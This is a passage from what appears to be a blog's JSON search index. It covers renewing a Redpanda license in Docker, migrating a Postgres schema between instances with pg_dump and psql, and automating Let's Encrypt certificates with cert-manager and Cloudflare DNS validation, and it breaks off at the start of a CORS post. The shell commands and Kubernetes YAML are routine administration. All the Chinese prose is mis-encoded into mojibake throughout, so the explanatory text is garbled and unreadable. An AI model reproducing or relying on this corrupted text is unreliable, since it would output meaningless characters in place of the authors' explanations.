src=\"/posts/20250725_redpanda_license/image-20250725132008481.png\"\u003e\u003c/p\u003e\n\u003cp\u003elicenseè¿‡æœŸäº†ï¼Œæ“¦çš„ï¼Œåªå…è®¸ç”¨30å¤©ï¼Œéœ€è¦ç»­è´¹äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€æ‰“å¼€ç½‘ç«™ï¼Œç”³è¯·30å¤©çš„å…è´¹license\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://cloud.redpanda.com/try-enterprise\"\u003ehttps://cloud.redpanda.com/try-enterprise\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eæ‰“å¼€ç½‘ç«™ï¼Œç„¶åå¡«å…¥å§“åå’Œé‚®ç®±ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªé•¿å­—ç¬¦ä¸²xyzï¼Œæ‹·è´ä¸‹æ¥\u003c/p\u003e\n\u003cp\u003eäºŒã€å»æœºå™¨ä¸Š\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬æ˜¯ç”¨docker composeå¯åŠ¨çš„ï¼Œæ‰€ä»¥éœ€è¦è¿›å…¥å®¹å™¨ï¼Œå¯¼å…¥license\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it redpanda-0 /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpk cluster license \u003cspan class=\"nb\"\u003eset\u003c/span\u003e xyz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€é‡å¯å®¹å™¨\u003c/p\u003e\n\u003cp\u003eæŒ‰é“ç†ä¸Šä¸€æ­¥å¼„å®Œï¼Œå°±åº”è¯¥å¥½äº†çš„ï¼Œå¯æƒœè¿™äº§å“åšçš„ç¨€çƒ‚ã€‚è¿˜å¿…é¡»é‡å¯å®¹å™¨æ‰èµ·ä½œç”¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker compose restart\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå°±okäº†ï¼Œä½†æ˜¯30å¤©å°±æ›´æ–°ä¸€æ¬¡licenseï¼Œè€Œä¸”å¿…é¡»è¦é‡å¯å®¹å™¨ï¼Œè¿™è°å—å¾—äº†å•Šã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹å‘¨å°±æŠ½ç©ºè£…ä¸€ä¸ªä¸ä¾èµ–Zookeeperï¼Œç”¨Rraftçš„Kafkaæ¥ç”¨ï¼Œå½»åº•å»æ‰è¿™ä¸ªä¸ä¼¦ä¸ç±»çš„è½¯ä»¶ã€‚\u003c/p\u003e","title":"Redpandaåˆ°æœŸåå¦‚ä½•ç»­License"},{"content":"å…¬å¸ç”Ÿäº§ç¯å¢ƒåœ¨AWSä½¿ç”¨äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\næµ‹è¯•ç¯å¢ƒæ˜¯åœ¨å†…ç½‘æ­å»ºäº†ä¸€ä¸ªpostgres 13æ•°æ®åº“ã€‚\né‚£æµ‹è¯•å’Œç”Ÿäº§çš„å®ä¾‹ä¸åŒï¼Œæ•°æ®åº“ä¸åŒï¼Œç”¨æˆ·åä¹Ÿä¸åŒï¼Œéœ€è¦æŠŠæµ‹è¯•ç¯å¢ƒçš„Aåº“çš„schema.publicè¿ç§»åˆ°ç”Ÿäº§Båº“çš„schema.publicã€‚\næ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒPGçš„æƒé™åˆ†ä¸‰å±‚ï¼Œæ•°æ®åº“ã€schemaã€schemaä¸­çš„å¯¹è±¡ã€‚\né‚£ä¹ˆç”¨pg_dumpçš„è¯ï¼Œå¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼Œé‚£ä¼šæŠŠæƒé™ä¹Ÿç»™å¸¦ä¸Šï¼Œé‚£å°±éº»çƒ¦å¤§äº†å»äº†ï¼\næ‰€ä»¥æ­£ç¡®çš„å¯¼å‡ºã€å¯¼å…¥æ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€é¦–å…ˆè¦è§‚å¯Ÿæºåº“ï¼Œçœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆextentionï¼Œåœ¨schema.publicæœ‰ä»€ä¹ˆFunctions\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçœ‹åˆ°uuid_generate\n# çœ‹çœ‹æœåŠ¡å™¨ç‰ˆæœ¬ select version(); PostgreSQL 13.14 é‚£å°±å¾ˆå¥‡æ€ªï¼Œextension åªæœ‰ä¸€ä¸ªplpgsqlï¼Œfunctionså´æœ‰ä¸€å †uuid_generate\né‚£åæœ‰å…«ä¹éœ€è¦ç”¨åˆ°extension uuid-oosp\nå…ˆå»ç›®çš„åº“å»ºä¸€ä¸ªå§\ncreate extension \u0026#34;uuid-ossp\u0026#34;; äºŒã€dumpæ•°æ®\nè¿™é‡Œè¦æ³¨æ„ï¼Œä¸è¦æŠŠä»»ä½•æƒé™çš„ä¸œè¥¿å¸¦è¿›æ¥\npg_dump -h 172.16.8.1 -U postgres -d source --schema=public --no-owner --no-privileges --file=export.sql # å…¨å¤‡ä»½çš„å‘½ä»¤ # export PGPASSWORD=\u0026#34;xxxxxxxx\u0026#34; # pg_dump -U bbc -h localhost -p 5432 bbc \u0026gt; dc_system.sql ç„¶åè¦ç¼–è¾‘çœ‹çœ‹è¿™ä¸ªå¯¼å…¥çš„æ–‡ä»¶\nå‘ç°æœ‰create schemaçš„è¯­å¥ï¼Œå¦‚æœç›®çš„æ•°æ®åº“å·²ç»æœ‰äº†ï¼Œé‚£éœ€è¦å»æ‰ã€‚\nå†çœ‹ä¸‹é¢ï¼š\nå»ºç«‹äº†ä¸€ä¸ªFUNCTIONï¼Œå¦‚æœå·²ç»å»ºç«‹äº†extensionï¼Œé‚£ä¹Ÿä¼šæŠ¥é”™ï¼Œä¸è¿‡è¿™2ç§é”™è¯¯æˆ‘ä»¬éƒ½å¯ä»¥ç›´æ¥ä¸ç”¨ç®¡ï¼Œç›´æ¥æ‰§è¡Œè¯•è¯•\nä¸‰ã€å¯¼å…¥ç›®æ ‡åº“\nè·‘ä¸€è·‘ï¼Œçœ‹ä¸€çœ‹ï¼š\npsql -h 10.8.0.1 -U dest -d dest -f export.sql æŠ¥äº†ä¸å°‘é”™\nä¸ä¸Šé¢ç›¸å¯¹åº”ï¼Œå»ºschema.publicå’ŒFUNCTIONæ—¶çš„é”™ï¼Œåé¢å°±æ²¡æœ‰é”™è¯¯äº†ï¼Œè¿™è¯´æ˜å°±æ­£ç¡®å¯¼å…¥äº†\nå››ã€ä¸€äº›æªæ–½\nç¬¬ä¸‰æ­¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰é—®é¢˜ï¼ŒAnywayï¼Œéƒ½æ— æ³•é¿å…ã€‚\néƒ½éœ€è¦ç¼–è¾‘export.sqlæˆ–è€…å¿½ç•¥é”™è¯¯æ¥é¿å…ã€‚\næµ‹äº†ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠschema.publicç»™å¹²æ‰ï¼Œä¹Ÿæ— æ³•é¿å…è¿™ç§æƒ…å†µï¼\n#ç”¨adminç”¨æˆ·ç™»å½• target åº“ï¼Œæ”¹å˜schema.publicçš„owner ALTER SCHEMA public OWNER TO target_user; #æ”¹å¥½åç”¨target_userç™»å½• target åº“ #è¿™æ—¶å€™å°±å¯ä»¥å¹²æ‰äº†schema.publicäº†ï¼Œç„¶åé‡å»ºï¼Œé‡å»ºåå°±åªæœ‰ target_user å¯¹ schema.public æœ‰æƒé™äº† DROP SCHEMA public CASCADE; CREATE SCHEMA public AUTHORIZATION target_user; #å¦‚ä¸Šï¼Œtarget_userå¯¹targetåº“ä¸­çš„schema.publicæ‹¥æœ‰æ‰€æœ‰æƒé™ #é‚£å°±å¯ä»¥å¯¼å…¥æ•°æ®äº† #å¯¼å…¥åéœ€è¦æŠŠownerç»™æ”¹å›å»ï¼Œä¾ç„¶éœ€è¦ç”¨adminç”¨æˆ·ç™»å½• target åº“ï¼Œæ”¹owner ALTER SCHEMA public OWNER TO admin; #ç„¶åèµ‹äºˆPUBLICçš„UCæƒé™ GRANT USAGE ON SCHEMA public TO public; GRANT CREATE ON SCHEMA public TO public; #å°±æ¢å¤åˆå§‹çŠ¶æ€çš„æƒé™äº† ä¸Šé¢çš„æ“ä½œæœ€å¥½ç”¨pgAdminæ¥å®Œæˆï¼Œå¦åˆ™å¤ªè‹¦é€¼äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250723-postgres_dump_restore/","summary":"\u003cp\u003eå…¬å¸ç”Ÿäº§ç¯å¢ƒåœ¨AWSä½¿ç”¨äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚\u003c/p\u003e\n\u003cp\u003eæµ‹è¯•ç¯å¢ƒæ˜¯åœ¨å†…ç½‘æ­å»ºäº†ä¸€ä¸ªpostgres 13æ•°æ®åº“ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£æµ‹è¯•å’Œç”Ÿäº§çš„å®ä¾‹ä¸åŒï¼Œæ•°æ®åº“ä¸åŒï¼Œç”¨æˆ·åä¹Ÿä¸åŒï¼Œéœ€è¦æŠŠæµ‹è¯•ç¯å¢ƒçš„Aåº“çš„schema.publicè¿ç§»åˆ°ç”Ÿäº§Båº“çš„schema.publicã€‚\u003c/p\u003e\n\u003cp\u003eæ™®åŠä¸€ä¸‹æ¦‚å¿µï¼ŒPGçš„æƒé™åˆ†ä¸‰å±‚ï¼Œæ•°æ®åº“ã€schemaã€schemaä¸­çš„å¯¹è±¡ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆç”¨pg_dumpçš„è¯ï¼Œå¦‚æœä¸å¸¦ä»»ä½•å‚æ•°ï¼Œé‚£ä¼šæŠŠæƒé™ä¹Ÿç»™å¸¦ä¸Šï¼Œé‚£å°±éº»çƒ¦å¤§äº†å»äº†ï¼\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥æ­£ç¡®çš„å¯¼å‡ºã€å¯¼å…¥æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€é¦–å…ˆè¦è§‚å¯Ÿæºåº“ï¼Œçœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆextentionï¼Œåœ¨schema.publicæœ‰ä»€ä¹ˆFunctions\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135100741\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135100741.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œçœ‹åˆ°\u003ccode\u003euuid_generate\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# çœ‹çœ‹æœåŠ¡å™¨ç‰ˆæœ¬\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e version\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePostgreSQL 13.14\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£å°±å¾ˆå¥‡æ€ªï¼Œextension åªæœ‰ä¸€ä¸ªplpgsqlï¼Œfunctionså´æœ‰ä¸€å †uuid_generate\u003c/p\u003e\n\u003cp\u003eé‚£åæœ‰å…«ä¹éœ€è¦ç”¨åˆ°\u003ccode\u003eextension uuid-oosp\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆå»ç›®çš„åº“å»ºä¸€ä¸ªå§\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecreate extension \u003cspan class=\"s2\"\u003e\u0026#34;uuid-ossp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€dumpæ•°æ®\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œè¦æ³¨æ„ï¼Œä¸è¦æŠŠä»»ä½•æƒé™çš„ä¸œè¥¿å¸¦è¿›æ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epg_dump -h 172.16.8.1 -U postgres -d \u003cspan class=\"nb\"\u003esource\u003c/span\u003e --schema\u003cspan class=\"o\"\u003e=\u003c/span\u003epublic --no-owner --no-privileges --file\u003cspan class=\"o\"\u003e=\u003c/span\u003eexport.sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å…¨å¤‡ä»½çš„å‘½ä»¤\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# export PGPASSWORD=\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# pg_dump -U bbc -h localhost -p 5432 bbc \u0026gt; dc_system.sql\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åè¦ç¼–è¾‘çœ‹çœ‹è¿™ä¸ªå¯¼å…¥çš„æ–‡ä»¶\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135729330\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135729330.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå‘ç°æœ‰create schemaçš„è¯­å¥ï¼Œå¦‚æœç›®çš„æ•°æ®åº“å·²ç»æœ‰äº†ï¼Œé‚£éœ€è¦å»æ‰ã€‚\u003c/p\u003e\n\u003cp\u003eå†çœ‹ä¸‹é¢ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250723135823265\" loading=\"lazy\" src=\"/posts/20250723-postgres_dump_restore/image-20250723135823265.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå»ºç«‹äº†ä¸€ä¸ªFUNCTIONï¼Œå¦‚æœå·²ç»å»ºç«‹äº†extensionï¼Œé‚£ä¹Ÿä¼šæŠ¥é”™ï¼Œä¸è¿‡è¿™2ç§é”™è¯¯æˆ‘ä»¬éƒ½å¯ä»¥ç›´æ¥ä¸ç”¨ç®¡ï¼Œç›´æ¥æ‰§è¡Œè¯•è¯•\u003c/p\u003e\n\u003cp\u003eä¸‰ã€å¯¼å…¥ç›®æ ‡åº“\u003c/p\u003e\n\u003cp\u003eè·‘ä¸€è·‘ï¼Œçœ‹ä¸€çœ‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsql -h 10.8.0.1 -U dest -d dest -f export.sql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŠ¥äº†ä¸å°‘é”™\u003c/p\u003e","title":"Postgresä¸åŒå®ä¾‹ã€ä¸åŒç”¨æˆ·ç›´æ¥çš„æ•°æ®å¯¼å‡ºå¯¼å…¥"},{"content":"è¿™ä¸ªåœºæ™¯éå¸¸çš„æœ‰æ„æ€ï¼š\nå…¬å¸å†…éƒ¨æœ‰è‹¥å¹²ä¸ªkubernetesé›†ç¾¤ï¼Œå±äºæµ‹è¯•ç¯å¢ƒï¼Œç ”å‘æ­å»ºäº†ä¸€å¥—SAASçš„ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒéœ€è¦xxx.abc.comçš„åŸŸåæ¥è®¿é—®ï¼ŒåŸŸåè§£æè®°å½•å…¨éƒ½æ˜¯192.168.0.xï¼Œä¾›å†…éƒ¨è®¿é—®ï¼ŒåŸŸåä¼šåŠ¨æ€ç”Ÿæˆï¼Œéœ€è¦è¯ä¹¦ä¹Ÿéšä¹‹ç”Ÿæˆï¼Œä¸”dnsåŸŸåæ‰˜ç®¡åœ¨cloudflareä¸Šã€‚\nåŸºæœ¬ç¯å¢ƒå¦‚ä¸Šï¼Œéº»çƒ¦çš„æ˜¯ cert-manager ä¸å¯èƒ½ç­¾å‘ç§ç½‘çš„è¯ä¹¦ï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œç”¨dnséªŒè¯çš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦äº†ï¼Œå¦‚æœé…ä¸Š external-dnsï¼Œé‚£dnsè§£æä¹Ÿä¸ç”¨åšäº†ï¼›åªè¦å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ç›´æ¥ç”Ÿæˆdnsè§£æè®°å½•å’Œå¯¹åº”çš„httpsè¯ä¹¦ã€‚\nå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€é…ç½® cloudflare API token\nç™»å½•cloudflareï¼Œå»ç”ŸæˆAPI Tokenï¼Œè·¯å¾„æ˜¯ï¼šUser Profile \u0026gt; API Tokens \u0026gt; API Tokens.\nPermissionsï¼š\nZone - DNS - Edit Zone Resources:\nInclude - All Zones cert-managerçš„å®˜æ–¹æ–‡æ¡£å±…ç„¶æ˜¯é”™çš„ï¼Œhttps://cert-manager.io/docs/configuration/acme/dns01/cloudflare/\næ¨èçš„ Zone - Zone - Read æ˜¯åŠ ä¸ä¸Šçš„ï¼Œæœ‰Editå°±è¶³å¤Ÿäº†\nç„¶åè·å¾—Tokençš„å­—ç¬¦ä¸²xxxxxx\näºŒã€å®‰è£…cert-manager\nè¿™ä¸ªç®€å•ï¼Œç›´æ¥ç”¨helmå®‰è£…\nç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025.07.09ï¼Œcert-manager æ˜¯ v1.18.2ï¼Œæ‰€ä»¥ç”¨æ–°å‘½ä»¤æ‰§è¡Œå®‰è£…\nhelm repo add jetstack https://charts.jetstack.io helm repo update #è€ç‰ˆæœ¬æ¯”å¦‚1.0 helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set installCRDs=true #æ–°ç‰ˆæœ¬v1.18.2 helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled=true ä¸‰ã€å‡†å¤‡ç­¾å‘æœºæ„Issuer\nä¸‹é¢è¦ç‰¹åˆ«æ³¨æ„ï¼Œsecretå¿…é¡»åœ¨namespaceï¼šcert-managerä¸­ï¼Œå› ä¸ºä¸Šä¸€æ­¥æˆ‘ä»¬åˆ›å»ºäº†ns cert-managerï¼Œpodä¹Ÿåœ¨è¿™ä¸ªnsä¸­ï¼Œç­¾å‘çš„è¿‡ç¨‹ä¸­æ˜¯ç”±cert-managerä¸­çš„podå‘èµ·è¯·æ±‚çš„\n# secret --- apiVersion: v1 kind: Secret metadata: name: cloudflare-api-token-secret namespace: cert-manager type: Opaque stringData: api-token: xxxxxxxx # Issuer --- apiVersion: cert-manager.io/v1 kind: ClusterIssuer metadata: name: letsencrypt-prod spec: acme: server: https://acme-v02.api.letsencrypt.org/directory email: zhangranrui@gmail.com privateKeySecretRef: name: letsencrypt-prod solvers: - dns01: cloudflare: email: zhangranrui@gmail.com apiTokenSecretRef: name: cloudflare-api-token-secret key: api-token å››ã€å‡†å¤‡podå’Œingress\n# nginx deployment --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx labels: app: nginx spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:latest ports: - containerPort: 80 --- # nginx Service apiVersion: v1 kind: Service metadata: name: nginx spec: selector: app: nginx ports: - protocol: TCP port: 80 targetPort: 80 type: ClusterIP ç„¶åæˆ‘ä»¬ç›´æ¥å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ä¼šè‡ªåŠ¨ç­¾å‘è¯ä¹¦äº†\n--- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: test-ingress annotations: cert-manager.io/cluster-issuer: \u0026#34;letsencrypt-prod\u0026#34; spec: tls: - hosts: - test.abc.com secretName: test-tls rules: - host: test.abc.com http: paths: - path: / pathType: Prefix backend: service: name: nginx port: number: 80 å››ã€ä¸€äº›è°ƒè¯•å‘½ä»¤ï¼š\n$ kubectl get issuer $ kubectl get clusterissuer $ kubectl get challenges $ kubectl describe challenge $ kubectl describe certificaterequest $ kubectl describe order äº”ã€ç›´æ¥ç”³è¯·è¯ä¹¦\nä¸Šé¢è®²äº†é€šè¿‡ingressæ¥è‡ªåŠ¨ç”³è¯·è¯ä¹¦ï¼Œé‚£æˆ‘ä»¬å¦‚æœä¸é€šè¿‡ingressï¼Œç›´æ¥ç”³è¯·è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ\nä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥æ¥ä¸ªç”³è¯·å³å¯\n--- apiVersion: cert-manager.io/v1 kind: Certificate metadata: name: tls-normal namespace: default spec: secretName: tls-normal commonName: abc.cde.com dnsNames: - abc.cde.com issuerRef: name: letsencrypt-prod kind: ClusterIssuer ","permalink":"https://rendoumi.com/posts/20250709-cert_manager_cloudflare/","summary":"\u003cp\u003eè¿™ä¸ªåœºæ™¯éå¸¸çš„æœ‰æ„æ€ï¼š\u003c/p\u003e\n\u003cp\u003eå…¬å¸å†…éƒ¨æœ‰è‹¥å¹²ä¸ªkubernetesé›†ç¾¤ï¼Œå±äºæµ‹è¯•ç¯å¢ƒï¼Œç ”å‘æ­å»ºäº†ä¸€å¥—SAASçš„ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒéœ€è¦xxx.abc.comçš„åŸŸåæ¥è®¿é—®ï¼ŒåŸŸåè§£æè®°å½•å…¨éƒ½æ˜¯192.168.0.xï¼Œä¾›å†…éƒ¨è®¿é—®ï¼ŒåŸŸåä¼šåŠ¨æ€ç”Ÿæˆï¼Œéœ€è¦è¯ä¹¦ä¹Ÿéšä¹‹ç”Ÿæˆï¼Œä¸”dnsåŸŸåæ‰˜ç®¡åœ¨cloudflareä¸Šã€‚\u003c/p\u003e\n\u003cp\u003eåŸºæœ¬ç¯å¢ƒå¦‚ä¸Šï¼Œéº»çƒ¦çš„æ˜¯ cert-manager ä¸å¯èƒ½ç­¾å‘ç§ç½‘çš„è¯ä¹¦ï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œç”¨dnséªŒè¯çš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦äº†ï¼Œå¦‚æœé…ä¸Š external-dnsï¼Œé‚£dnsè§£æä¹Ÿä¸ç”¨åšäº†ï¼›åªè¦å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ç›´æ¥ç”Ÿæˆdnsè§£æè®°å½•å’Œå¯¹åº”çš„httpsè¯ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€é…ç½® cloudflare API token\u003c/p\u003e\n\u003cp\u003eç™»å½•cloudflareï¼Œå»ç”ŸæˆAPI Tokenï¼Œè·¯å¾„æ˜¯ï¼š\u003cstrong\u003eUser Profile \u0026gt; API Tokens \u0026gt; API Tokens\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003ePermissionsï¼š\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eZone - DNS - Edit\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eZone Resources:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eInclude - All Zones\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003ecert-managerçš„å®˜æ–¹æ–‡æ¡£å±…ç„¶æ˜¯é”™çš„ï¼Œhttps://cert-manager.io/docs/configuration/acme/dns01/cloudflare/\u003c/p\u003e\n\u003cp\u003eæ¨èçš„ Zone - Zone - Read æ˜¯åŠ ä¸ä¸Šçš„ï¼Œæœ‰Editå°±è¶³å¤Ÿäº†\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250709104459501\" loading=\"lazy\" src=\"/posts/20250709-cert_manager_cloudflare/image-20250709104459501.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åè·å¾—Tokençš„å­—ç¬¦ä¸²xxxxxx\u003c/p\u003e\n\u003cp\u003eäºŒã€å®‰è£…cert-manager\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªç®€å•ï¼Œç›´æ¥ç”¨helmå®‰è£…\u003c/p\u003e\n\u003cp\u003eç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ\u003ccode\u003e2025.07.09ï¼Œcert-manager æ˜¯ v1.18.2\u003c/code\u003eï¼Œæ‰€ä»¥ç”¨æ–°å‘½ä»¤æ‰§è¡Œå®‰è£…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo add jetstack https://charts.jetstack.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è€ç‰ˆæœ¬æ¯”å¦‚1.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set \u003cspan class=\"nv\"\u003einstallCRDs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ–°ç‰ˆæœ¬v1.18.2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehelm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€å‡†å¤‡ç­¾å‘æœºæ„Issuer\u003c/p\u003e","title":"å†…ç½‘kubernetes+cloudflare+cert-managerè‡ªåŠ¨ç­¾å‘è¯ä¹¦"},{"content":"Cross-Origin Resource Sharing (CORS) è·¨åŸŸï¼Œä¸€ä¸ªç½‘ç«™å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªç½‘ç«™çš„èµ„æºï¼Œå°±éœ€è¦è·¨åŸŸäº†ã€‚\næœ€é€šä¿—ç‚¹ï¼Œå°±æ˜¯æœåŠ¡å™¨çš„è¿”å›å¤´ä¸Šè¦åŠ ä¸Šä¸‰è¡Œï¼š\nAccess-Control-Allow-Origin\u0026#34;, \u0026#34;*\u0026#34; Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, POST, OPTIONS\u0026#34; Access-Control-Allow-Headers\u0026#34;, 